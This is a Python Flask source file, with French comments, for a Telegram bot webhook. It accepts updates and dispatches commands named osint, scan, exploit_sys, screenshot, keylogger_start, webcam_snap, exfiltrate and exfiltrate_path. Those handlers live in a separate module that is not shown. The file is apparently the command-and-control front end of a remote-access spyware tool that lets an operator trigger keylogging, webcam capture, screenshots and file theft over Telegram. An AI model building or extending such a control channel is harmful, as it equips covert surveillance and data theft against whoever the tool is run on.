# telegram/webhook.py

import os
import traceback
import asyncio
from flask import Blueprint, request, Response
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler

# ✅ Import clés depuis utils
from modules.utils import get_api_keys

# ✅ Commandes Telegram importées du module
from telegram_bot.telegram_bot import (
    menu, osint, scan, exploit_sys,
    screenshot, keylogger_start,
    webcam_snap, exfiltrate, exfiltrate_path,
    rapport
)

# 🔐 Chargement des clés
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")

# ✅ Définition du webhook Flask
telegram_webhook = Blueprint("telegram_webhook", __name__)

@telegram_webhook.route("/telegram/webhook", methods=["POST"])
def handle_webhook():
    try:
        # 🔐 Vérification du secret Telegram
        if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET_TOKEN:
            print("❌ Requête rejetée : mauvais token secret.")
            return Response("Unauthorized", status=403)

        update_data = request.get_json(force=True)
        update = Update.de_json(update_data, bot=None)

        # 🔁 Nouvelle instance Application (anti boucle fermée)
        app = ApplicationBuilder().token(TOKEN).build()

        # ➕ Enregistrement des commandes supportées
        app.add_handler(CommandHandler("menu", menu))
        app.add_handler(CommandHandler("osint", osint))
        app.add_handler(CommandHandler("scan", scan))
        app.add_handler(CommandHandler("exploit_sys", exploit_sys))
        app.add_handler(CommandHandler("screenshot", screenshot))
        app.add_handler(CommandHandler("keylogger_start", keylogger_start))
        app.add_handler(CommandHandler("webcam_snap", webcam_snap))
        app.add_handler(CommandHandler("exfiltrate", exfiltrate))
        app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
        app.add_handler(CommandHandler("rapport", rapport))

        # 🧠 Traitement asynchrone
        async def process():
            await app.initialize()
            await app.process_update(update)

        # 🎯 Event loop propre pour Render
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process())
        loop.close()

        print("✅ Webhook Telegram traité avec succès.")
        return Response("OK", status=200)

    except Exception as e:
        print(f"❌ Erreur webhook : {e}")
        traceback.print_exc()
        return Response("Erreur serveur", status=500)
